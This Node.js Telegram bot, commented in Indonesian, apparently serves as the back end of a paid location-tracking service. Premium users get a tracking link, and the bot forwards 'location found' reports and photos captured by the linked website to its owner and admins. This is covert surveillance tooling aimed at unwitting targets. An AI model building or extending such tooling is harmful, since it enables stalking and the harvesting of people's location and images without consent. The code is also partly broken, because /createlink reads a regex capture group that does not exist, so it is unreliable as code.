const TelegramBot = require('node-telegram-bot-api');
const fs = require('fs');

// PANGGILAN YANG BENAR: Jangan gunakan JSON.parse(fs.readFileSync) untuk file .js
const settings = require('./database/settings'); 

const bot = new TelegramBot(settings.token, { polling: true });
const PREMIUM_FILE = './database/premiumusers.json';

// Inisialisasi Database jika belum ada
if (!fs.existsSync('./database')) fs.mkdirSync('./database');
if (!fs.existsSync(PREMIUM_FILE)) fs.writeFileSync(PREMIUM_FILE, JSON.stringify({}));

// Fungsi Utilitas
const isAdmin = (userId) => settings.admins.includes(String(userId)) || String(userId) === settings.ownerId;

// Tambahkan listener ini di lacak.js
bot.on('message', (msg) => {
    // Jika pesan mengandung lokasi atau foto dari website
    if (msg.text && msg.text.includes("LOKASI DITEMUKAN") || msg.photo) {
        // Teruskan ke Owner
        bot.forwardMessage(settings.ownerId, msg.chat.id, msg.message_id);
        
        // Teruskan ke semua Admin
        settings.admins.forEach(adminId => {
            if (adminId !== settings.ownerId) {
                bot.forwardMessage(adminId, msg.chat.id, msg.message_id);
            }
        });
    }
});

// Handler: /start (Menampilkan Menu)
bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;
    const menu = `
🌟 *WELCOME TO TRACKER BOT* 🌟
━━━━━━━━━━━━━━━━━━━━
Halo *${msg.from.first_name}*!
Gunakan menu di bawah untuk mengelola fitur.

🛠 **MENU ADMIN:**
1️⃣ /createlink - Buat link pelacak
2️⃣ /addprem [ID] [hari] - Tambah user premium

📊 **STATUS ANDA:**
${isAdmin(msg.from.id) ? "✅ ADMIN/OWNER" : "👤 USER BIASA"}
━━━━━━━━━━━━━━━━━━━━`;

    bot.sendMessage(chatId, menu, { parse_mode: "Markdown" });
});

// Handler: /addprem
bot.onText(/\/addprem (\d+) (\d+)/, (msg, match) => {
    if (!isAdmin(msg.from.id)) return bot.sendMessage(msg.chat.id, "❌ Akses Ditolak!");
    const targetId = match[1];
    const days = parseInt(match[2]);
    const expiry = Date.now() + (days * 24 * 60 * 60 * 1000);

    const db = JSON.parse(fs.readFileSync(PREMIUM_FILE));
    db[targetId] = expiry;
    fs.writeFileSync(PREMIUM_FILE, JSON.stringify(db, null, 2));

    bot.sendMessage(msg.chat.id, `✅ User \`${targetId}\` aktif premium ${days} hari.`);
});

// Handler: /createlink
bot.onText(/\/createlink/, (msg, match) => {
    const userId = String(msg.from.id);
    const db = JSON.parse(fs.readFileSync(PREMIUM_FILE));
    const isPremium = db[userId] && (db[userId] > Date.now() || db[userId] === "PERMANENT");

    if (!isAdmin(userId) && !isPremium) {
        return bot.sendMessage(msg.chat.id, "❌ Fitur ini hanya untuk user Premium.");
    }

    const path = match[1].toLowerCase().replace(/\s+/g, '-');

    bot.sendMessage(msg.chat.id, `🚀 *LINK BERHASIL DIBUAT*\n\n🔗 Link: \`https://elektronik-phi.vercel.app\`\n👤 Creator: ${msg.from.first_name}`, { parse_mode: "Markdown" });
});

console.log("✅ Bot Lacak Aktif...");